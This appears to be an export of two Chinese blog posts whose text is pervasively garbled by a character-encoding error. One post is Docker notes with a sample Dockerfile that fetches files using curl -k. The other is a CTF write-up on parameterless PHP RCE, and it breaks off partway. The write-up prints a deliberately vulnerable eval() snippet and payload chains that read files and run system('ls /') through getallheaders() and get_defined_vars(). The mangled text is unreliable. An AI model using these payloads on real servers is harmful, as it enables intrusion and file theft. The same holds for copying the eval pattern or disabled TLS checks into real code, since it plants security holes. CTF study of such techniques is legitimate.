å¯åŠ¨å·²åœæ­¢çš„å®¹å™¨ docker start container_name docker restart é‡å¯ä¸€ä¸ªå®¹å™¨ docker restart container_name docker rm åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ docker rm container_name docker rmi åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªé•œåƒ docker rmi my-image docker logs æŸ¥çœ‹å®¹å™¨çš„æ—¥å¿— docker logs container_name docker inspect è·å–å®¹å™¨æˆ–é•œåƒçš„è¯¦ç»†ä¿¡æ¯ docker inspect container_name docker exec -it è¿›å…¥å®¹å™¨çš„äº¤äº’å¼ç»ˆç«¯ docker exec -it container_name /bin/bash docker network ls åˆ—å‡ºæ‰€æœ‰ Docker ç½‘ç»œ docker network ls docker volume ls åˆ—å‡ºæ‰€æœ‰ Docker å· docker volume ls docker-compose up å¯åŠ¨å¤šå®¹å™¨åº”ç”¨ï¼ˆä» docker-compose.yml æ–‡ä»¶ï¼‰ docker-compose up docker-compose down åœæ­¢å¹¶åˆ é™¤ç”± docker-compose å¯åŠ¨çš„å®¹å™¨ã€ç½‘ç»œç­‰ docker-compose down docker info æ˜¾ç¤º Docker ç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ docker info docker version æ˜¾ç¤º Docker å®¢æˆ·ç«¯å’Œå®ˆæŠ¤è¿›ç¨‹çš„ç‰ˆæœ¬ä¿¡æ¯ docker version docker stats æ˜¾ç¤ºå®¹å™¨çš„å®æ—¶èµ„æºä½¿ç”¨æƒ…å†µ docker stats docker login ç™»å½• Docker ä»“åº“ docker login docker logout ç™»å‡º Docker ä»“åº“ docker logout Docker é•œåƒè®¾ç½®\rç”±äºä¸€äº›åŸå› ï¼Œå›½å†…æ— æ³•ç›´è¿Dockerå®˜æ–¹ä»“åº“ï¼ŒåŸæœ¬çš„é•œåƒç«™ç°åœ¨ä¹Ÿéƒ½æ— æ³•ä½¿ç”¨äº†ï¼Œç°åœ¨åªå‰©ä¸€éƒ¨åˆ†ä¸ªäººæ­çš„é•œåƒç«™å¯ä»¥ä½¿ç”¨ï¼Œå› æ­¤è¯·ç»å¸¸æ£€æŸ¥è‡ªå·±çš„Dockeré•œåƒæ˜¯å¦è¿˜èƒ½ç”¨\nç›®å‰å›½å†…å¯ç”¨Dockeré•œåƒæºæ±‡æ€»ï¼ˆæˆªè‡³2025å¹´3æœˆï¼‰\né…ç½®æ–¹å¼ï¼š\rä¸´æ—¶ä½¿ç”¨ï¼š\rç›´æ¥ä½¿ç”¨ï¼š\nç›´æ¥ç”¨é•œåƒåŸŸåæ‹¼æ¥ä¸Šå®˜æ–¹é•œåƒåã€‚ä¾‹å¦‚ï¼šè¦æ‹‰å– istio/distrolessï¼Œå¯ä»¥è¿™æ ·å†™ï¼š\n1 docker pull docker-0.unsee.tech/istio/distroless é•¿ä¹…æœ‰æ•ˆï¼š\rä»¥ä¸‹å‘½ä»¤åœ¨Debian 12.5,Ubuntu 16.04+é€‚ç”¨\nä¿®æ”¹æ–‡ä»¶ /etc/docker/daemon.jsonï¼ˆå¦‚æœä¸å­˜åœ¨åˆ™éœ€è¦åˆ›å»ºåˆ›å»ºï¼Œæ³¨æ„ä¸è¦å†™å…¥ä¸­æ–‡ï¼Œè¦å¸¦ https://ï¼‰ï¼Œå¹¶é‡å¯æœåŠ¡ã€‚\n1 2 # åˆ›å»ºç›®å½• sudo mkdir -p /etc/docker 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # å†™å…¥é…ç½®æ–‡ä»¶ sudo nano /etc/docker/daemon.json æˆ– sudo vi /etc/docker/daemon.json # å†™å…¥ä¸‹é¢çš„\t{ \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://docker-0.unsee.tech\u0026#34;, \u0026#34;https://docker-cf.registry.cyou\u0026#34;, \u0026#34;https://docker.1panel.live\u0026#34; ] } # é‡å¯dockeræœåŠ¡ sudo systemctl daemon-reload \u0026amp;\u0026amp; sudo systemctl restart docker ä½¿ç”¨docker pull æ‹‰å–é•œåƒè¿›è¡Œæµ‹è¯•\nDocker file\rä»€ä¹ˆæ˜¯ Dockerfileï¼Ÿ\rDockerfile æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ŒåŒ…å«äº†æ„å»º Docker é•œåƒçš„æ‰€æœ‰æŒ‡ä»¤ã€‚\nDockerfile æ˜¯ä¸€ä¸ªç”¨æ¥æ„å»ºé•œåƒçš„æ–‡æœ¬æ–‡ä»¶ï¼Œæ–‡æœ¬å†…å®¹åŒ…å«äº†ä¸€æ¡æ¡æ„å»ºé•œåƒæ‰€éœ€çš„æŒ‡ä»¤å’Œè¯´æ˜ã€‚\né€šè¿‡å®šä¹‰ä¸€ç³»åˆ—å‘½ä»¤å’Œå‚æ•°ï¼ŒDockerfile æŒ‡å¯¼ Docker æ„å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„é•œåƒã€‚\nä¾‹å¦‚ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 FROM golang:1.18-alpine AS builder COPY . /app RUN mkdir /out WORKDIR /app RUN go env -w GO111MODULE=on \\ \u0026amp;\u0026amp; go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct \\ \u0026amp;\u0026amp; CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o /out/main . RUN cp -r /app/assets /app/views -t /out FROM centos:7 COPY --from=builder /out /app RUN chmod +x /usr/bin/curl \\ \u0026amp;\u0026amp; rm -rf /etc/yum.repos.d/*.repo \\ \u0026amp;\u0026amp; curl -k -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo \\ \u0026amp;\u0026amp; yum --exclude=kernel* update -y \\ \u0026amp;\u0026amp; yum install -y epel-release \\ \u0026amp;\u0026amp; rm -rf /etc/yum.repos.d/epel.repo \\ \u0026amp;\u0026amp; curl -k -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo \\ \u0026amp;\u0026amp; yum groupinstall -y \u0026#34;Development Tools\u0026#34; \\ \u0026amp;\u0026amp; yum install -y gcc openssl-devel bzip2-devel libffi-devel zlib-devel make wget \\ \u0026amp;\u0026amp; cd /usr/src \\ \u0026amp;\u0026amp; curl -k -o Python-3.10.4.tgz https://mirrors.huaweicloud.com/python/3.10.4/Python-3.10.4.tgz \\ \u0026amp;\u0026amp; tar xzf Python-3.10.4.tgz \\ \u0026amp;\u0026amp; cd Python-3.10.4 \\ \u0026amp;\u0026amp; ./configure --enable-optimizations \\ \u0026amp;\u0026amp; make altinstall \\ \u0026amp;\u0026amp; rm -f /usr/src/Python-3.10.4.tgz \\ \u0026amp;\u0026amp; ln -s /usr/local/bin/python3.10 /usr/bin/python3 \\ \u0026amp;\u0026amp; yum clean all \\ \u0026amp;\u0026amp; mkdir -p /home/John \\ \u0026amp;\u0026amp; chmod -R 755 /home/John COPY shell/* /home/John/ COPY start.sh /app/start.sh RUN chmod +x /home/John/shell.py WORKDIR /app EXPOSE 8000 CMD [\u0026#34;/bin/bash\u0026#34;, \u0026#34;/app/start.sh\u0026#34;] åŸºç¡€çŸ¥è¯†\ræ¯ä¸ªä¿ç•™å…³é”®å­—ï¼ˆæŒ‡ä»¤ï¼‰éƒ½å¿…é¡»æ˜¯å¤§å†™å­—æ¯ æ‰§è¡Œä»ä¸Šåˆ°ä¸‹é¡ºåºæ‰§è¡Œ #è¡¨ç¤ºæ³¨é‡Š æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šåˆ›å»ºæäº¤ä¸€ä¸ªæ–°çš„é•œåƒå±‚ Dockerfileï¼šæ˜¯å®šä¹‰äº†æ„å»ºé•œåƒæ–‡ä»¶çš„æºä»£ç ï¼Œèƒ½å¤Ÿæ„å»ºé•œåƒæ–‡ä»¶ Docker Imagesï¼šé€šè¿‡DockerFileæ„å»ºç”Ÿæˆçš„é•œåƒï¼Œæœ€ç»ˆå‘å¸ƒå’Œè¿è¡Œçš„äº§å“ Docker Containerï¼šå®¹å™¨å°±æ˜¯é•œåƒè¿è¡Œèµ·æ¥æä¾›æœåŠ¡çš„ Dockerfileçš„æŒ‡ä»¤\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #æŒ‡å®šåŸºç¡€é•œåƒï¼Œä¸€åˆ‡ä»è¿™é‡Œæ„å»º FROM #é•œåƒæ˜¯è°å†™çš„ï¼Œå§“å+é‚®ç®± MAINTAINER #é•œåƒæ„å»ºè¿è¡Œæ—¶éœ€è¦è¿è¡Œçš„å‘½ä»¤ RUN #æ·»åŠ çš„å†…å®¹ ADD #æŒ‡å®šé•œåƒçš„å·¥ä½œç›®å½• WORKDIR #æŒ‡å®šæŒ‚è½½çš„å®¹å™¨å· VOLUME #æŒ‡å®šæš´éœ²çš„ç«¯å£ EXPOSE #æŒ‡å®šå®¹å™¨å¯åŠ¨æ—¶è¦è¿è¡Œçš„å‘½ä»¤ï¼Œåªæœ‰æœ€åä¸€ä¸ªä¼šç”Ÿæ•ˆï¼Œå¯è¢«æ›¿ä»£ CMD #æŒ‡å®šå®¹å™¨å¯åŠ¨æ—¶è¦è¿è¡Œçš„å‘½ä»¤ï¼Œå¯ä»¥è¿½åŠ å‘½ä»¤ ENTRYPOINT #å½“æ„å»ºä¸€ä¸ªè¢«ç»§æ‰¿çš„DockerFileï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šè¿è¡ŒONBUILDæŒ‡ä»¤ ONBUILD #ç±»ä¼¼ADDï¼Œå°†æ–‡ä»¶æ‹·è´è¿›é•œåƒä¸­ COPY #æ„å»ºçš„æ—¶å€™è®¾ç½®ç¯å¢ƒå˜é‡ ENV Docker Compose\rCompose æ˜¯ç”¨äºå®šä¹‰å’Œè¿è¡Œå¤šå®¹å™¨ Docker åº”ç”¨ç¨‹åºçš„å·¥å…·ã€‚é€šè¿‡ Composeï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ YML æ–‡ä»¶æ¥é…ç½®åº”ç”¨ç¨‹åºéœ€è¦çš„æ‰€æœ‰æœåŠ¡ã€‚ç„¶åï¼Œä½¿ç”¨ä¸€ä¸ªå‘½ä»¤ï¼Œå°±å¯ä»¥ä» YML æ–‡ä»¶é…ç½®ä¸­åˆ›å»ºå¹¶å¯åŠ¨æ‰€æœ‰æœåŠ¡ã€‚\næ³¨æ„ï¼šå®‰è£…dockerçš„åŒæ—¶ï¼Œå·²ç»å®‰è£…äº†Docker compose V2ï¼Œæ— éœ€å†å¦å¤–å®‰è£… Docker compose V1 ï¼›Docker compose V2çš„å‘½ä»¤ä»¥docker composeå¼€å¤´ï¼Œå¦‚docker compose up\nDocker-compose.yml\rDockerfileè®©å®¹å™¨åœ¨ä»»ä½•åœ°æ–¹è¿è¡Œï¼Œä½†å¦‚æœè¦è¿è¡Œå¤šä¸ªå®¹å™¨å°±ååˆ†éº»çƒ¦ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨docker-compose.ymlæ–‡ä»¶ã€‚\nä¾‹å¦‚ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 version: \u0026#39;3.8\u0026#39; services: app: build: context: . dockerfile: Dockerfile ports: - \u0026#34;8000:8000\u0026#34; # å¯åœ¨æ­¤å¤„ä¿®æ”¹æ˜ å°„åˆ°å®¿ä¸»æœºçš„ç«¯å£ environment: FLAG: \u0026#34;ISCC{cl1mb3d_p3ngl41_sh4d0w}\u0026#34; # å¯åœ¨æ­¤å¤„åŠ¨æ€ä¿®æ”¹FLAGå€¼ command: [\u0026#34;/home/John/.bashrc\u0026#34;, \u0026#34;/app/start.sh\u0026#34;] ä¸¤ä¸ªæ¦‚å¿µ\nservicesï¼ˆæœåŠ¡ï¼‰ï¼šå®¹å™¨ã€åº”ç”¨ï¼ˆmysqlã€nginxâ€¦ï¼‰ projectï¼ˆé¡¹ç›®ï¼‰ï¼šä¸€ç»„å…³è”çš„å®¹å™¨ Docker composeå¸¸ç”¨å‘½ä»¤\r1 2 3 4 5 6 7 8 9 10 11 12 13 up\tå¯åŠ¨å®¹å™¨ï¼Œç»ˆç«¯è¿è¡Œ images\tåˆ—å‡ºé•œåƒ down\tåœæ­¢å’Œåˆ é™¤å®¹å™¨ã€ç½‘ç»œã€å·ã€é•œåƒ start\tå¯åŠ¨é¡¹ç›®ä¸­å®¹å™¨ï¼Œåå°è¿è¡Œ logs\tæŸ¥çœ‹é¡¹ç›®ä¸­å®¹å™¨æ—¥å¿— stop\tåœæ­¢é¡¹ç›®ä¸­å®¹å™¨ restart\té‡å¯é¡¹ç›®ä¸­å®¹å™¨ ps æŸ¥çœ‹å¯åŠ¨çš„å®¹å™¨ #é€‰é¡¹å¦‚ä¸‹ -f file æŒ‡å®šComposeæ¨¡æ¿æ–‡ä»¶ï¼Œé»˜è®¤ä¸ºdocker-compose.ymlï¼Œå¯ä»¥å¤šæ¬¡æŒ‡å®š -p project æŒ‡å®šé¡¹ç›®åç§°ï¼Œé»˜è®¤å°†ä½¿ç”¨æ‰€åœ¨ç›®å½•åç§°ä½œä¸ºé¡¹ç›®å -d\tåå°è¿è¡Œå®¹å™¨ requirements.txt\ræœ‰æ—¶å€™å¯èƒ½ä¼šé‡è§ä½¿ç”¨requirements.txtæ¥å­˜å‚¨ä¾èµ–çš„æƒ…å†µï¼Œè¿™ä¸ªä¸å¿…å¤šè¨€ï¼ˆï¼‰\nPythoné¡¹ç›®ä¾èµ–ï¼Œç”Ÿæˆrequirements.txt æœ‰ä¸¤ç§æ–¹æ³•\n1ã€è¿›å…¥éœ€è¦ç”Ÿæˆæ–‡ä»¶çš„ç›®å½•ï¼Œæ‰§è¡Œ\n1 pip freeze \u0026gt; requirements.txt ï¼Œæ­¤æ–¹æ³•ä¼šåŒ…å«ç¯å¢ƒæ‰€æœ‰çš„ä¾èµ–åŒ…ã€‚\nç›´æ¥ä½¿ç”¨æ­¤å‘½ä»¤ï¼Œä¼šæŠŠå½“å‰å…±ç”¨pythonç¯å¢ƒçš„æ‰€æœ‰åŒ…éƒ½å†™è¿›å»ï¼Œè¿™äº›ä¸å¿…è¦çš„ã€‚å¯ä»¥åœ¨ç›®æ ‡ç›®å½•ä¸‹é¢å…ˆpipenv shellï¼Œè¿›å…¥pipenvç¯å¢ƒï¼Œå†ç”¨ä¸Šé¢çš„å‘½ä»¤ï¼Œäº§ç”Ÿçš„requirements.txt å°±åªåŒ…å«è™šæ‹Ÿç¯å¢ƒçš„ä¾èµ–é¡¹ã€‚\n2ã€pip install pipreqs\nè¿›å…¥éœ€è¦ç”Ÿæˆæ–‡ä»¶çš„ç›®å½•æ‰§è¡Œï¼š pipreqs ./ (æˆ–è€…ç›´æ¥ pipreqs D:\\test(å®é™…è·¯å¾„ï¼‰ï¼‰\nåœ¨æ­¤æ—¶å¯èƒ½ä¼šé‡è§\nUnicodeDecodeError: â€˜gbkâ€™ codec canâ€™t decode byte 0x80 in position 776: illegal multibyte sequence\nè¿™ä¸ªé”™è¯¯.\nè§£å†³æ–¹æ³•ï¼šæŒ‡å®šç¼–ç æ ¼å¼ pipreqs ./ \u0026ndash;encoding=utf8\nå¦‚æœè¦å®‰è£…requirements.txtä¸­çš„ç±»åº“å†…å®¹ï¼Œé‚£ä¹ˆä½ å¯ä»¥æ‰§è¡Œ:\n1 pip install -r requirements.txt åœ¨dockerfileé‡Œå°±æ˜¯\n1 RUN pipe install -r requirements.txt å‚è€ƒï¼š\nDockerå­¦ä¹ ç¬”è®°â€”â€”DockerFile\nDockerå­¦ä¹ ç¬”è®°â€”â€”Docker Compose\ndockeréƒ¨ç½²ï¼Œç”Ÿæˆä¾èµ–é¡¹æ¸…å•requirements.txt\n","date":"2025-06-01T12:28:46+08:00","image":"https://miro.medium.com/v2/resize:fit:1100/format:webp/1*vQK4s0lOiK1ZkcXxFNIMDQ.png","permalink":"https://Oight.github.io/p/docker%E5%AD%A6%E4%B9%A0/","title":"Dockerå­¦ä¹ "},{"content":"Web\ræ— å‚RCE/PHPSESSIDç»•è¿‡\ræ— å‚RCE\rTGCTFä¸­å¹¶éæ˜¯æ ‡å‡†çš„æ— å‚RCEï¼Œä½†è¿˜æ˜¯å¯ä»¥é€šè¿‡æ— å‚RCEæ¥åšï¼Œä¸è¿‡é¢„æœŸè€ƒç‚¹æ˜¯PHPSESSIDç»•è¿‡\nç»å…¸çš„æ— å‚RCEåƒè¿™æ ·ï¼š\n1 2 3 4 5 6 php \u0026lt;?php if(\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z,_]+((?R)?)/\u0026#39;, NULL, $_GET[\u0026#39;exp\u0026#39;]){ eval($_GET[\u0026#39;exp\u0026#39;]); } ?\u0026gt; æ­£åˆ™è¡¨è¾¾å¼é€’å½’åŒ¹é…å‡½æ•°ä¸­çš„å‚æ•°ï¼Œä½¿æˆ‘ä»¬æ— æ³•ä¼ å‚ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åªä½¿ç”¨å‡½æ•°æ¥è¾¾åˆ°è·å–flagçš„ç›®çš„\næ— å‚RCEæœ¬è´¨æ˜¯ç¨‹åºä¸­é”™è¯¯åœ°ä½¿ç”¨äº†å‘½ä»¤æ‰§è¡Œå‡½æ•°å¦‚ eval() ä¸”é‡‡ç”¨äº†å­˜åœ¨ç»•è¿‡éšæ‚£çš„é»‘åå•åŒ¹é…ç”¨æˆ·è¾“å…¥ï¼Œè€ƒå¯Ÿçš„ç‚¹æ˜¯å¯¹PHPä¸­å‡½æ•°ç‰¹æ€§çš„åˆ©ç”¨\nä¸‹é¢æ•´ç†ä¸€äº›å¯ä»¥è¢«åˆ©ç”¨çš„å‡½æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 scandir() :å°†è¿”å›å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„åˆ—è¡¨ã€‚è¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•åç§°ï¼ˆglob()å¯æ›¿æ¢ï¼‰ localeconv() ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚ï¼ˆä½†æ˜¯è¿™é‡Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯â€˜.â€™ï¼Œè¿™ä¸ª.çš„ç”¨å¤„å¾ˆå¤§ï¼‰ current() ï¼šè¿”å›æ•°ç»„ä¸­çš„å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚pos()å’Œcurrent()æ˜¯åŒä¸€ä¸ªä¸œè¥¿ getcwd() :å–å¾—å½“å‰å·¥ä½œç›®å½• dirname():å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ† array_flip() :äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„ array_rand() :ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ array_reverse():å°†æ•°ç»„å†…å®¹åè½¬ strrev():ç”¨äºåè½¬ç»™å®šå­—ç¬¦ä¸² getcwd()ï¼šè·å–å½“å‰å·¥ä½œç›®å½•è·¯å¾„ dirname() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚ chdir() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚ eval()ã€assert()ï¼šå‘½ä»¤æ‰§è¡Œ hightlight_file()ã€show_source()ã€readfile()ï¼šè¯»å–æ–‡ä»¶å†…å®¹ æ¯”å¦‚ï¼š\nscandir(â€˜.â€™) å¯ä»¥è¿”å›å½“å‰ç›®å½•ï¼Œä½†æ˜¯æ­£åˆ™åŒ¹é…äº†æˆ‘ä»¬çš„å‚æ•°ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•ä¼ å‚ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•æ„é€ ä¸€ä¸ªâ€ . â€œ ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ localeconv() ,å› ä¸ºå®ƒè¿”å›çš„ç¬¬ä¸€ä¸ªå…ƒç´ å°±æ˜¯ â€œ . â€œ ( å…³äºä¸ºä»€ä¹ˆ localeconv() è¿”å›çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ . å¯ä»¥çœ‹è¿™é‡Œï¼šPHP localeconv() å‡½æ•° )\nè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªæŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶çš„Payloadï¼š\n?å‚æ•°=var_dump(scandir(current(localeconv())));\nè¿™é‡Œ current() çš„ä½œç”¨æ˜¯æŠŠ localeconv() è¿”å›çš„ç‚¹å–å‡º ï¼ˆåŸç†çœ‹è¿™é‡Œï¼šPHP current() å‡½æ•° ï¼‰\næ ¹æ®flagæ–‡ä»¶çš„ä½ç½®ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥æ­é… next() æˆ– prev() å’Œ array_reverse() ä¸€èµ·ä½¿ç”¨\næ¯”å¦‚ï¼š\næˆ‘ä»¬ä½¿ç”¨ ?å‚æ•°=var_dump(scandir(current(localeconv()))); çœ‹åˆ°å½“å‰ç›®å½•æ˜¯è¿™æ ·çš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 php array(3) { [0]=\u0026gt; string(1) \u0026#34;.\u0026#34; [1]=\u0026gt; string(2) \u0026#34;..\u0026#34; [2]=\u0026gt; string(3) \u0026#34;.git\u0026#34; [3]=\u0026gt; string(4) \u0026#34;flag.php\u0026#34; [4]=\u0026gt; string(5) \u0026#34;index.php\u0026#34; } æˆ‘ä»¬çœ‹åˆ° flag.php åœ¨å€’æ•°ç¬¬äºŒä¸ªï¼Œæ¯”è¾ƒé åçš„ä½ç½®ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç”¨ array_reverse() å°†æ•°ç»„å†…å®¹åè½¬ï¼Œè®©å®ƒä»å€’æ•°ç¬¬äºŒå˜æˆæ­£æ•°ç¬¬äºŒï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 php array(3) { [0]=\u0026gt; string(5) \u0026#34;index.php\u0026#34; [1]=\u0026gt; string(4) \u0026#34;flag.php\u0026#34; [2]=\u0026gt; string(3) \u0026#34;.git\u0026#34; [3]=\u0026gt; string(2) \u0026#34;..\u0026#34; [4]=\u0026gt; string(1) \u0026#34;.\u0026#34; } ç„¶åæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ next() ä½¿å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå³flag.phpï¼‰å¹¶å°†å…¶è¾“å‡ºï¼Œæœ€åæˆ‘ä»¬å¯ä»¥ç”¨ highlight_file() è¿”å›æ–‡ä»¶å†…å®¹\nç›¸å…³çš„æ–¹æ³•ï¼š\n1 2 3 4 5 end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚ å¸¸è§Payloadï¼š\n1 2 3 4 5 6 7 highlight_file(array_rand(array_flip(scandir(getcwd())))); //æŸ¥çœ‹å’Œè¯»å–å½“å‰ç›®å½•æ–‡ä»¶ print_r(scandir(dirname(getcwd()))); //æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶ print_r(scandir(next(scandir(getcwd())))); //æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶ show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶ show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶ show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶ show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//è¿™ä¸ªå¾—çˆ†ç ´ï¼Œä¸ç„¶æ‰‹åŠ¨è¦åˆ·æ–°å¾ˆä¹…ï¼Œå¦‚æœæ–‡ä»¶æ˜¯æ­£æ•°æˆ–å€’æ•°ç¬¬ä¸€ä¸ªç¬¬äºŒä¸ªæœ€å¥½ä¸è¿‡äº†ï¼Œç›´æ¥å®šä½ ä»¥ä¸Šæ˜¯å¦‚ä½•è¯»å–flag ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å‘½ä»¤æ‰§è¡Œï¼š\nä½¿ç”¨session_id() æ¥RCEçš„ä¹Ÿç®—åœ¨è¿™é‡Œé¢ï¼Œä½†è¿™ä¸ªæˆ‘ä»¬å•æ‹å‡ºæ¥æ”¾åé¢\ngetallheaders()\rgetallheaders()è¿”å›å½“å‰è¯·æ±‚çš„æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯ï¼Œå±€é™äºApacheï¼ˆ apache_request_headers()å’Œgetallheaders()åŠŸèƒ½ç›¸ä¼¼ï¼Œå¯äº’ç›¸æ›¿ä»£ï¼Œä¸è¿‡ä¹Ÿæ˜¯å±€é™äºApache ï¼‰\nå½“æˆ‘ä»¬ç¡®å®šæœåŠ¡å™¨ä½¿ç”¨Apacheæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ getallheaders() å‡½æ•°æ¥æŸ¥çœ‹è¯·æ±‚å¤´ä¿¡æ¯ï¼Œå¦‚æœæˆåŠŸå›æ˜¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨è¯·æ±‚å¤´æœ€åå†™å…¥æ¶æ„ä»£ç ï¼Œç„¶ååˆ©ç”¨end() æ¥æ‰§è¡Œ\nä¾‹å¦‚ï¼šæˆ‘ä»¬å†™å…¥ phpinfo();\nvar_dump(end(getallheaders()));\nend()æŒ‡å‘æœ€åä¸€è¡Œçš„ä»£ç ï¼Œè¾¾åˆ°phpinfoçš„ç›®çš„ï¼Œç„¶åå¯ä»¥è¿›ä¸€æ­¥å»rceã€‚\nget_defined_vars()\rget_defined_vars() å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚å®ƒå¯ä»¥å›æ˜¾å…¨å±€å˜é‡ $_GETã€$_POSTã€$_FILESã€$_COOKIEï¼Œ\nè¿”å›æ•°ç»„é¡ºåºä¸º$_GET--\u0026gt;$_POST--\u0026gt;$_COOKIE--\u0026gt;$_FILES\nåŒæ ·é¦–å…ˆç¡®è®¤æ˜¯å¦æœ‰å›æ˜¾ï¼š\nprint_r(get_defined_vars());\næˆ‘ä»¬å¯ä»¥åœ¨åé¢æ‹¼æ¥ä¸€ä¸ªæ¶æ„ä»£ç ï¼š\na=eval(end(current(get_defined_vars())));\u0026amp;b=system(â€˜ls /â€˜); // aæ˜¯åŸæœ‰çš„å‚æ•° //æŠŠevalæ¢æˆassertä¹Ÿè¡Œ ï¼Œèƒ½æ‰§è¡Œsystem(â€˜ls /â€˜)å°±è¡Œ\næ‰§è¡Œé€»è¾‘ï¼š\n1. å‚æ•°ä¼ é€’\rç”¨æˆ·å‘é€çš„ GET è¯·æ±‚å‚æ•°ï¼š\n1 2 plaintext a=eval(end(current(get_defined_vars())));\u0026amp;b=system(\u0026#39;ls /\u0026#39;); å‚æ•° a çš„å€¼ä¸ºå­—ç¬¦ä¸² eval(end(current(get_defined_vars())))ã€‚ å‚æ•° b çš„å€¼ä¸ºå­—ç¬¦ä¸² system('ls /')ã€‚ 2. æ‰§è¡Œ eval($_GET['a'])\rPHP è„šæœ¬è°ƒç”¨ eval($_GET['a'])ï¼Œå°†å‚æ•° a çš„å€¼ä½œä¸º PHP ä»£ç æ‰§è¡Œï¼š\n1 2 php eval(\u0026#34;eval(end(current(get_defined_vars())));\u0026#34;); 3. å†…å±‚ eval 